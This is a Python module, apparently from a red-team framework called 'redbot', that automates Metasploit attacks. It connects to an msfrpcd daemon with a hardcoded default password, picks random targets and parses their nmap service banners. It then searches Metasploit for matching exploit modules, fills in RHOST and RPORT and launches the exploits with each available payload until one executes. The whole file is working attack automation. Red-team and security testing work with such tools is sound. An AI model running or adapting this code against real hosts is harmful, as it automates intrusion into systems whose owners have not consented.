import platform
import random
from http.client import ResponseNotReady
from subprocess import run
from time import sleep

from celery.exceptions import SoftTimeLimitExceeded
from typing import List

from metasploit.msfrpc import MsfRpcClient, MsfRpcError
from redbot.core.async import celery
from redbot.core.models import storage
from redbot.core.utils import random_targets
from redbot.modules import Attack
from redbot.modules.discovery import get_hosts


class MSF(Attack):
    name = 'metasploit'
    notes = "Requires a running msfrpcd daemon, and nmap scans run with -sV."
    settings = {
        'password': {
            'name': 'msfrpcd Password',
            'default': 'redbot',
            'description': 'Password to connect to the msfrpcd daemon.'
        },
        'payload': {
            'name': 'Payload Options',
            'default': '',
            'description': '(Optional)'
        }
    }

    @classmethod
    def run_attack(cls):
        targets = random_targets()
        cls.log("Starting MSF attack on " + str([t[0] for t in targets]))
        g = cls.attack_all(attacks=(msf_attack,), targets=targets)
        return g, targets


cls = MSF


def _slow_msf_search(client: MsfRpcClient, query: str):
    exploits = client.modules.exploits
    results = []
    for e in exploits:
        try:
            exploit = client.modules.use('exploit', e)
        except ResponseNotReady:
            exploit = client.modules.use('exploit', e)
        if query.lower() in exploit.name.decode().lower() + exploit.description.decode().lower():
            results.append(e)
    return results


def msf_search(client: MsfRpcClient, query: str) -> List[str]:
    cached = storage.exists('metasploit:' + query)
    if not cached:
        print("Cache miss, using slow MSF search for", query)
        results = _slow_msf_search(client, query)
        for result in results:
            storage.sadd('metasploit:' + query, result.decode())
        if not results:
            storage.sadd('metasploit:' + query, 0)
        return results
    return list(storage.smembers('metasploit:' + query))


def get_lock() -> str:
    return 'msfrpcd:' + platform.node() + ':lock'


@celery.task
def msf_attack(host: str, *args, **kwargs):
    client = None
    tries = 0
    while not client:
        if tries > 5:
            MSF.log("Giving up connecting to msfrpcd.", 'danger')
            return
        try:
            client = MsfRpcClient(MSF.get_setting('password'))
        except ConnectionRefusedError:
            MSF.log("Can't connect to msfrpcd. Trying to start it...", 'warning')
            if storage.get(get_lock()):
                sleep(10)
            else:
                storage.incr(get_lock())
                run(['msfrpcd', '-P', MSF.get_setting('password')])
                storage.delete(get_lock())
        except MsfRpcError:
            MSF.log("Error connecting to msfrpcd. Is the password correct?", 'danger')
        tries += 1

    target = get_hosts()[host]
    query = ""
    port = None
    # Loop through available services in random order, stop when there is a banner
    index = 1
    for p, data in random.sample(target['ports'].items(), len(target['ports'])):
        if data.get('banner'):
            # Naive banner parsing
            if query.lower() in ["microsoft", "windows"]:
                index = 2
            port = p
            break
    exploit = None
    print(data['banner'])
    while not exploit and index < len(data['banner'].split()):
        exploit = None
        print("Getting exploit")
        try:
            query = data['banner'].split()[index]
            if query.endswith(':'):
                index += 1
                continue
            print("Query: " + query)
            try:
                mod = random.choice(msf_search(client, query))
            except SoftTimeLimitExceeded:
                MSF.log("We're running out of time while trying to search. Increase task timeout to prevent this.",
                        "warning")
                return
            exploit = client.modules.use('exploit', mod)
        except (IndexError, MsfRpcError):
            index += 1
    if not exploit:
        MSF.log("Couldn't find exploit.", "warning")
        print("Couldn't find exploit.")
        return
    print("Went with " + str(exploit.modulename))
    MSF.log("Using exploit {} against {}:{}".format(exploit.modulename, host, port))
    for r in exploit.required:
        if r == b'RHOST':
            exploit['RHOST'.encode()] = host
        elif r == b'RPORT':
            exploit['RPORT'.encode()] = port
    execute = None
    p = 0
    while p < len(exploit.payloads) and not execute:
        try:
            execute = exploit.execute(payload=exploit.payloads[p].decode())
        except ValueError:
            p += 1
        else:
            MSF.log('Exploit ' + str(exploit.modulename) + ' against ' + host + ' launched.', 'success')
